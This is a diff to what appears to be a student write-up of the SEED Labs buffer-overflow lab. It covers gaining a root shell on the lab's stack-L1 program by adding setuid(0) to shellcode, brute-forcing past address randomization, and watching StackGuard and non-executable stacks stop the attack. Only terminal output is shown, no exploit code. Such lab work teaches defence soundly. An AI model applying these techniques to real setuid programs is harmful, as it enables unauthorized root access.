@@ -98,4 +98,65 @@ We thus construct the badfile, and upon running `stack-L4`, we are successful in
 
 ## Task 7: Defeating `dash`'s Countermeasure
 
+With `dash` and without the `setuid(0)` system call, both `a32.out` and `a64.out` present a shell with user ID `1000(seed)`; with `setuid(0)` included in the shellcode, both programs present a shell with user ID `0(root)`.
+
+Repeating the attack on Level 1 with the `setuid(0)` system call prepended to the shellcode, this once again is successful in obtaining a root shell.
+
+```
+$ ./exploit.py 
+$ ./stack-L1
+Input size: 517
+# id
+uid=0(root) gid=1000(seed) groups=...
+# ls -l /bin/sh /bin/zsh /bin/dash
+-rwxr-xr-x 1 root root 129816 Jul 18  2019 /bin/dash
+lrwxrwxrwx 1 root root      9 May 16 18:20 /bin/sh -> /bin/dash
+-rwxr-xr-x 1 root root 878288 Feb 24  2020 /bin/zsh
+```
+
+## Task 8: Defeating Address Randomization
+
+After enabling address randomization, the attack against `stack-L1` no longer works, at least on the first attempt:
+
+```
+$ ./stack-L1
+Input size: 517
+Segmentation fault
+```
+
+We employ a brute-force approach, running `brute-force.sh`:
+
+```
+./brute-force.sh 
+0 minutes and 0 seconds elapsed.
+The program has been running 1 times so far.
+Input size: 517
+./brute-force.sh: line 14: 77347 Segmentation fault      ./stack-L1
+
 ...
+
+1 minutes and 6 seconds elapsed.
+The program has been running 59262 times so far.
+Input size: 517
+# id
+uid=0(root) gid=1000(seed) groups=...
+```
+
+## Task 9: Experimenting with Other Countermeasures
+
+### Turn on the StackGuard Protection
+
+Launching the attack against `stack-L1` with StackGuard enabled:
+
+```
+$ ./stack-L1
+Input size: 517
+*** stack smashing detected ***: terminated
+Aborted
+```
+
+The StackGuard mechanism is able to detect before the function returns that the stack canary has been overwritten via buffer overflow, and exits the program.
+
+### Turn on the Non-executable Stack Protection
+
+After recompiling with option `-z noexecstack` (enabled by default), both `a32.out` and `a64.out` produce segmentation faults upon trying to return to the shellcode on the stack.
